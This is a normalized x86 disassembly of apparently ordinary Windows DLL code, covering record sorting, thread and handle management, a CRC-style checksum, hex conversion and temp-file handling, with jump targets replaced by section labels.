mov eax [ ebp - 0x44 ]
mov [ edi + 0x34 ] eax
lea eax [ ebp - 0x40 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ edi + 0x50 ]
call sub_100049b0
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ edi + 0x5c ]
call sub_100049b0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x78 ]
call sub_10014980
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push 0xffffffff
push 0x0
push eax
call sub_100018b0
sub_1003abf0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
push ebx
lea ebx [ edx * 2 + 0x2 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
push esi
push edi
cmp ebx eax
jge r-xdata
jne r-xdata
imul eax ebx 0x68
lea edx [ ecx - 0x30 ]
add edx eax
add ecx 0x38
add eax ecx
cmp [ edx + 0x14 ] 0x10
mov ecx [ edx + 0x10 ]
mov [ ebp - 0xc ] ecx
jb r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
call sub_1003adc0
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
imul eax eax 0x68
lea edi [ ecx - 0x68 ]
imul esi edx 0x68
add edi eax
add esi ecx
cmp esi edi
je r-xdata
cmp [ eax + 0x14 ] 0x10
mov edi [ eax + 0x10 ]
jb r-xdata
mov edx [ edx ]
lea eax [ edi + 0x18 ]
lea ecx [ esi + 0x18 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push edi
mov ecx esi
call sub_100018b0
cmp edi ecx
mov esi ecx
cmovb esi edi
test esi esi
je r-xdata
mov eax [ eax ]
mov eax [ edi + 0x30 ]
lea ecx [ esi + 0x38 ]
mov [ esi + 0x30 ] eax
mov eax [ edi + 0x34 ]
mov [ esi + 0x34 ] eax
lea eax [ edi + 0x38 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
cmp edi ecx
jb r-xdata
sub esi 0x4
jb r-xdata
lea eax [ edi + 0x50 ]
push eax
lea ecx [ esi + 0x50 ]
call sub_100049b0
lea eax [ edi + 0x5c ]
push eax
lea ecx [ esi + 0x5c ]
call sub_100049b0
mov edx [ ebp + 0x8 ]
dec edx
push 0xffffffff
push 0x0
push eax
call sub_100018b0
dec ebx
xor eax eax
cmp edi ecx
setne al
test eax eax
cmp esi 0xfffffffc
je r-xdata
lea ebx [ ebx ]
lea eax [ esi + 0x18 ]
lea ecx [ edi + 0x18 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push esi
mov ecx edi
call sub_100018b0
imul edi [ ebp - 0x8 ] 0x68
imul esi ebx 0x68
add edi [ ebp - 0x4 ]
add esi [ ebp - 0x4 ]
cmp edi esi
je r-xdata
xor eax eax
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
add eax 0x4
add edx 0x4
sub esi 0x4
jae r-xdata
mov eax [ esi + 0x30 ]
lea ecx [ edi + 0x38 ]
mov [ edi + 0x30 ] eax
mov eax [ esi + 0x34 ]
mov [ edi + 0x34 ] eax
lea eax [ esi + 0x38 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
jns r-xdata
mov ecx [ ebp - 0xc ]
sbb eax eax
or eax 0x1
jmp r-xdata
cmp esi 0xfffffffd
je r-xdata
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
lea eax [ esi + 0x50 ]
push eax
lea ecx [ edi + 0x50 ]
call sub_100049b0
lea eax [ esi + 0x5c ]
push eax
lea ecx [ edi + 0x5c ]
call sub_100049b0
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ ebp - 0x4 ]
lea ebx [ ebx * 2 + 0x2 ]
mov [ ebp - 0x8 ] edx
cmp ebx eax
jl r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
test eax eax
jne r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
cmp esi 0xfffffffe
je r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
cmp esi 0xffffffff
je r-xdata
mov al [ eax + 0x3 ]
cmp al [ edx + 0x3 ]
je r-xdata
sub_1003adc0
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx edx
mov [ ebp - 0x8 ] ecx
push esi
mov [ ebp - 0x4 ] ebx
lea eax [ ebx - 0x1 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] ebx
jge r-xdata
imul esi ebx 0x68
mov ebx [ ebp + 0xc ]
add esi ecx
cmp esi ebx
je r-xdata
mov edx [ ebp + 0xc ]
add edx 0x38
mov [ ebp - 0x14 ] edx
push edi
mov edi edi
lea eax [ ebx + 0x18 ]
lea ecx [ esi + 0x18 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_100018b0
mov esi edx
mov esi [ edx ]
jmp r-xdata
mov eax [ ebx + 0x30 ]
lea ecx [ esi + 0x38 ]
mov [ esi + 0x30 ] eax
mov eax [ ebx + 0x34 ]
mov [ esi + 0x34 ] eax
lea eax [ ebx + 0x38 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
cmp ebx ecx
mov edx ecx
cmovb edx ebx
test edx edx
je r-xdata
mov eax [ eax ]
cmp [ eax + 0x14 ] 0x10
mov ebx [ eax + 0x10 ]
jb r-xdata
lea eax [ ebx + 0x50 ]
push eax
lea ecx [ esi + 0x50 ]
call sub_100049b0
lea eax [ ebx + 0x5c ]
push eax
lea ecx [ esi + 0x5c ]
call sub_100049b0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0xffffffff
push 0x0
push eax
call sub_100018b0
cmp ebx ecx
jb r-xdata
sub edx 0x4
jb r-xdata
imul esi [ ebp - 0x4 ] 0x68
add esi [ ebp - 0x8 ]
cmp esi edi
je r-xdata
xor eax eax
cmp ebx ecx
setne al
test eax eax
cmp edx 0xfffffffc
je r-xdata
mov ecx [ eax ]
cmp ecx [ esi ]
jne r-xdata
lea eax [ edi + 0x18 ]
lea ecx [ esi + 0x18 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push edi
mov ecx esi
call sub_100018b0
mov ebx [ ebp - 0x4 ]
xor eax eax
mov cl [ eax ]
cmp cl [ esi ]
jne r-xdata
add eax 0x4
add esi 0x4
sub edx 0x4
jae r-xdata
mov eax [ edi + 0x30 ]
lea ecx [ esi + 0x38 ]
mov [ esi + 0x30 ] eax
mov eax [ edi + 0x34 ]
mov [ esi + 0x34 ] eax
lea eax [ edi + 0x38 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
jns r-xdata
mov ecx [ ebp - 0x10 ]
sbb eax eax
or eax 0x1
jmp r-xdata
cmp edx 0xfffffffd
je r-xdata
lea eax [ edi + 0x50 ]
push eax
lea ecx [ esi + 0x50 ]
call sub_100049b0
lea eax [ edi + 0x5c ]
push eax
lea ecx [ esi + 0x5c ]
call sub_100049b0
mov eax [ ebp - 0xc ]
mov ebx eax
mov ecx [ ebp - 0x8 ]
dec eax
cdq
sub eax edx
mov [ ebp - 0x4 ] ebx
mov edx [ ebp - 0x14 ]
sar eax 0x1
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] ebx
jl r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
test eax eax
jne r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ esi + 0x1 ]
jne r-xdata
imul edi eax 0x68
add edi ecx
cmp [ edx + 0x14 ] 0x10
mov ecx [ edx + 0x10 ]
mov [ ebp - 0x10 ] ecx
lea eax [ edi + 0x38 ]
jb r-xdata
jmp r-xdata
cmp edx 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
mov cl [ eax + 0x2 ]
cmp cl [ esi + 0x2 ]
jne r-xdata
cmp edx 0xffffffff
je r-xdata
mov al [ eax + 0x3 ]
cmp al [ esi + 0x3 ]
je r-xdata
sub_1003af90
push ebp
mov ebp esp
push ecx
mov eax ecx
mov [ ebp - 0x4 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
lea esi [ edx + 0x18 ]
lea edi [ ebx + 0x18 ]
lea ecx [ ecx ]
cmp edi esi
je r-xdata
push 0xffffffff
push 0x0
lea eax [ esi - 0x18 ]
mov ecx ebx
push eax
call sub_100018b0
mov eax [ esi + 0x18 ]
lea ecx [ edi + 0x20 ]
mov [ edi + 0x18 ] eax
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
lea eax [ esi + 0x20 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push esi
mov ecx edi
call sub_10003a20
lea eax [ esi + 0x38 ]
push eax
lea ecx [ edi + 0x38 ]
call sub_100049b0
lea ecx [ esi + 0x44 ]
push ecx
lea ecx [ edi + 0x44 ]
call sub_100049b0
lea eax [ esi - 0x18 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
sub esi 0x68
sub ebx 0x68
sub edi 0x68
lea eax [ esi - 0x18 ]
cmp ebx eax
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_1003b030
push ebp
mov ebp esp
push 0xffffffff
push sub_10053439
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
lea eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ eax + 0x14 ] 0xf
mov [ eax + 0x10 ] 0x0
mov [ ebp - 0x14 ] eax
mov [ eax ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ eax + 0x18 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov [ ecx + 0x20 ] 0x0
mov [ ecx + 0x24 ] 0x0
mov [ ecx + 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x2
mov [ ecx + 0x38 ] 0x0
mov [ ecx + 0x3c ] 0x0
mov [ ecx + 0x40 ] 0x0
mov [ ebp - 0x4 ] 0x3
xor eax eax
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x30 ] 0x3
mov [ ecx + 0x34 ] 0x55
mov [ ecx + 0x44 ] 0x2
mov [ ecx + 0x48 ] 0x14
mov [ ecx + 0x4c ] 0x0
mov [ ecx + 0x50 ] ax
mov [ ecx + 0x54 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_1003b110
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003b140
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1003b140
push ebp
mov ebp esp
push 0xffffffff
push sub_10053489
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
xor edi edi
mov eax [ esi + 0x24 ]
sub eax [ esi + 0x20 ]
sar eax 0x2
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x38 ] 0x0
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x40 ] 0x0
mov eax [ esi + 0x24 ]
inc edi
sub eax [ esi + 0x20 ]
sar eax 0x2
cmp edi eax
jb r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ ebp - 0x4 ] 0xffffffff
add esi 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x24 ] 0x0
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1003b240
push ebp
mov ebp esp
push 0xffffffff
push sub_1004ef08
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
lea eax [ esi + 0x8 ]
push eax
call [ DeleteCriticalSection@IAT ]
mov [ esi + 0x4 ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1003b2c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004ef08
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
lea eax [ esi + 0x8 ]
push eax
call [ DeleteCriticalSection@IAT ]
mov [ esi + 0x4 ] 0x0
sub_1003b380
push ebp
mov ebp esp
push 0xffffffff
push sub_100534b8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ esi + 0x10 ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1003b400
push ebp
mov ebp esp
push 0xffffffff
push sub_100534b8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push eax
call [ CloseHandle@IAT ]
mov [ esi + 0x10 ] 0x0
sub_1003b470
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
je r-xdata
push 0x0
push 0x0
push esi
push sub_1003b540
push 0x0
push 0x0
call [ CreateThread@IAT ]
xor ecx ecx
mov [ esi + 0x10 ] eax
test eax eax
pop esi
setne cl
mov eax ecx
retn
xor eax eax
pop esi
retn
sub_1003b540
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1003f1e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
push 0x8007
call [ SetErrorMode@IAT ]
mov ebx 0x1
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov ecx esi
call [ eax + 0x20 ]
mov eax [ esi + 0x10 ]
mov [ esi + 0x10 ] 0x0
push eax
call [ CloseHandle@IAT ]
mov edi [ Sleep@IAT ]
jmp r-xdata
push 0x1
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x24 ]
jmp r-xdata
call edi
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax ebx
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1003b5cb
mov esp [ ebp - 0x18 ]
xor ebx ebx
mov [ ebp - 0x4 ] 0xfffffffe
mov eax ebx
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1003b5f0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1003b630
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
not eax
test edx edx
je r-xdata
not eax
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebp
retn 0x8
movzx ecx [ esi ]
lea esi [ esi + 0x1 ]
xor ecx eax
shr eax 0x8
and ecx 0xff
xor eax [ ecx * 4 + r--data ]
dec edx
jne r-xdata
sub_1003b670
push ebp
mov ebp esp
push 0xffffffff
push sub_10053518
mov eax [ fs : 0x0 ]
push eax
sub esp 0x834
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi edx
mov ebx ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x838 ] 0x0
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] 0x0
mov [ ebp - 0x83c ] ebx
mov [ ebx ] 0x0
mov [ ebp - 0x4 ] 0x0
xor ecx ecx
xor esi esi
mov [ ebp - 0x838 ] 0x1
mov [ ebp - 0x834 ] ecx
cmp [ edi + 0x10 ] ecx
jbe r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
mov edi edi
cmp [ edi + 0x14 ] 0x10
jb r-xdata
lea eax [ esi + esi ]
mov [ ebp - 0x820 ] 0x0
push eax
lea eax [ ebp - 0x818 ]
mov [ ebp - 0x81c ] 0x0
push eax
lea ecx [ ebp - 0x830 ]
mov [ ebp - 0x81c ] 0xf
mov [ ebp - 0x820 ] 0x0
mov [ ebp - 0x830 ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x830 ]
push 0xffffffff
push 0x0
push eax
mov ecx ebx
call sub_100050b0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x81c ] 0x10
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov ecx [ ebp - 0x834 ]
xor esi esi
mov [ ebp - 0x81c ] 0xf
mov [ ebp - 0x820 ] 0x0
mov [ ebp - 0x830 ] 0x0
push [ ebp - 0x830 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp esi 0x400
jb r-xdata
test esi esi
je r-xdata
movzx eax [ eax + ecx ]
push eax
lea eax [ ebp - 0x818 ]
lea eax [ eax + esi * 2 ]
push r--data
push eax
call sub_1003d8bd
mov ecx [ ebp - 0x834 ]
add esp 0xc
inc ecx
inc esi
mov [ ebp - 0x834 ] ecx
cmp ecx [ edi + 0x10 ]
jb r-xdata
lea eax [ esi + esi ]
mov [ ebp - 0x820 ] 0x0
push eax
lea eax [ ebp - 0x818 ]
mov [ ebp - 0x81c ] 0x0
push eax
lea ecx [ ebp - 0x830 ]
mov [ ebp - 0x81c ] 0xf
mov [ ebp - 0x820 ] 0x0
mov [ ebp - 0x830 ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp - 0x830 ]
push 0xffffffff
push 0x0
push eax
mov ecx ebx
call sub_100050b0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x81c ] 0x10
jb r-xdata
mov [ ebp - 0x81c ] 0xf
mov [ ebp - 0x820 ] 0x0
mov [ ebp - 0x830 ] 0x0
push [ ebp - 0x830 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1003b8a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10053562
mov eax [ fs : 0x0 ]
push eax
sub esp 0x410
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi edx
mov eax ecx
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x4 ] 0x0
xor edi edi
mov [ ebp - 0x418 ] 0x0
mov [ eax + 0x14 ] 0xf
mov [ eax + 0x10 ] edi
mov [ ebp - 0x41c ] eax
mov [ eax ] 0x0
mov [ ebp - 0x4 ] edi
mov ebx 0x1
mov [ ebp - 0x418 ] 0x1
cmp [ esi + 0x10 ] ebx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
lea esp [ esp ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
lea ecx [ eax - 0x61 ]
cmp cl 0x5
ja r-xdata
sub al 0x30
jmp r-xdata
mov al [ eax + ebx - 0x1 ]
mov dl [ ecx + ebx ]
lea ecx [ eax - 0x30 ]
cmp cl 0x9
ja r-xdata
lea ecx [ eax - 0x41 ]
cmp cl 0x5
ja r-xdata
sub al 0x57
jmp r-xdata
lea ecx [ edx - 0x30 ]
cmp cl 0x9
ja r-xdata
xor al al
sub al 0x37
jmp r-xdata
lea ecx [ edx - 0x61 ]
cmp cl 0x5
ja r-xdata
sub dl 0x30
jmp r-xdata
lea ecx [ edx - 0x41 ]
cmp cl 0x5
ja r-xdata
sub dl 0x57
jmp r-xdata
shl al 0x4
or al dl
mov [ ebp + edi - 0x410 ] al
inc edi
cmp edi 0x400
jne r-xdata
xor dl dl
sub dl 0x37
jmp r-xdata
add ebx 0x2
cmp ebx [ esi + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x414 ]
lea eax [ ebp - 0x410 ]
push edi
push eax
call sub_10005470
xor edi edi
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
test edi edi
je r-xdata
mov eax [ ebp - 0x414 ]
mov ecx [ ebp - 0x414 ]
lea eax [ ebp - 0x410 ]
push edi
push eax
call sub_10005470
sub_1003ba00
push ebp
mov ebp esp
push 0xffffffff
push sub_100535a9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x10 ] 0x0
call [ GetSystemTimeAsFileTime@IAT ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
mov [ ebp - 0x4 ] 0x0
push 0x0
push 0x2710
push eax
push edx
mov [ ebp - 0x10 ] 0x1
call sub_1004b160
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_1003baa0
push ebp
mov ebp esp
push 0xffffffff
push sub_100535ee
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x30 ] 0x7
mov [ esi + 0x2c ] eax
mov [ esi + 0x1c ] ax
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x8 ] ax
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1003bb60
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003bb90
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1003bb90
push ebp
mov ebp esp
push 0xffffffff
push sub_10053626
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
cmp [ esi + 0x2c ] 0x0
jbe r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x30 ] 0x8
jb r-xdata
cmp [ esi + 0x30 ] 0x8
lea eax [ esi + 0x1c ]
jb r-xdata
mov [ esi + 0x30 ] 0x7
xor eax eax
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x1c ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push [ esi + 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
push eax
call [ DeleteFileW@IAT ]
test eax eax
jne r-xdata
mov eax [ eax ]
xor eax eax
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x4 ]
call j_sub_1003f3e3#2
add esp 0x4
call [ GetLastError@IAT ]
sub_1003bc50
push ebp
mov ebp esp
push 0xffffffff
push sub_10053658
mov eax [ fs : 0x0 ]
push eax
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x21c ]
push 0x20a
push 0x0
push eax
call sub_10045ec0
push 0x20a
lea eax [ ebp - 0x428 ]
push 0x0
push eax
call sub_10045ec0
add esp 0x18
lea eax [ ebp - 0x21c ]
push eax
push 0x104
call [ GetTempPathW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp eax 0x104
ja r-xdata
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x8 ] ax
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
lea eax [ ebp - 0x21c ]
push eax
call [ CreateDirectoryW@IAT ]
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
cmp [ edi + 0x18 ] 0x8
lea eax [ edi + 0x4 ]
jb r-xdata
